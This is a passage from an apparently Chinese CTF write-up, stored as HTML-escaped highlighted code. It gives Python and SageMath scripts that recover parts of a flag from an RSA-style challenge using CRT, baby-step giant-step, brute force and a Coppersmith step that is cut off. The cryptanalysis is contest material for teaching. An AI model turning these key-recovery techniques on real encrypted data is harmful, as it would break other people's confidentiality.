        &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;egcd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;lcm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lcm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GCD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lcm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;No Answer!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;x0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k1&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;x0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x0&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;m1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m1&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;ans&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;crt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;LCM&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;reduce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;lambda&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gcd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;P&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;reduce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;lambda&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ans&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LCM&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;assert&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dq&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inverse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bit_length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bit_length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;b = {b}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ans&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LCM&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# b = 8998739874124476330077050284905438547791211705007347879192939614678547567964644612148886036506107930061008040551064553043959063715512574971543459965428364&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;bsgs 一下得到 e1+e2（使用SageMath）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;c2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5482916971077907100465900758386122395988093179254480170511691938212094686909346076331158369021240925800603504683768019354372182250751332596677686598659819347466337649573401050759675695503404236960750776674833294023038703715840843231408879195866584742586386333373862336287408841247917195883597624403390910372&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8998739874124476330077050284905438547791211705007347879192939614678547567964644612148886036506107930061008040551064553043959063715512574971543459965428364&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;m1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;F&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IntegerModRing&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;mm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;bsgs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 1751345818&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Util.number&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;e12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1751345818&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;74961624700570825661425074699932176609321469056449513783085829938826707337287502198895054962001192345105970228367025392103044122840249185367359738330285315139075044769056261215439422786423423520242882616599069262320657892736490573199953747616316977906614094081725739377860475149681397270351494502879810040119&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;TABLE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;01234567890abcdef&amp;#34;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;o&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;e1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TABLE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TABLE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TABLE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TABLE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;e2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e1&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e2&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# b&amp;#39;321e5195&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后一部分flag3，用coppersmith来解。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;mbar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bytes_to_long&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;321e5195&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;padding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1b1e4c40&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;


